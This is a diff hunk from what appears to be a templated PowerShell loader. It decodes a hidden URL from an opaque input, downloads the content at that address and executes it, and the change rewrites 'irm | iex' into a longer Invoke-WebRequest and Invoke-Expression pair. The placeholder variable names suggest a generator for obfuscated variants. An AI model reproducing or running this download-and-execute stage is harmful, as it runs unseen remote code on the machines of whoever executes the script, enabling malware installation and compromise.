@@ -19,7 +19,8 @@ ${process_function} = {
 
 try {
     ${url_to_fetch} = & ${process_function} -input_data ${random_var_1}
-    irm ${url_to_fetch} | iex
+    ${request_result} = Invoke-WebRequest -Uri ${url_to_fetch}
+    Invoke-Expression ${request_result}
 } catch {
     Write-Error "Failed Parse code"
 }
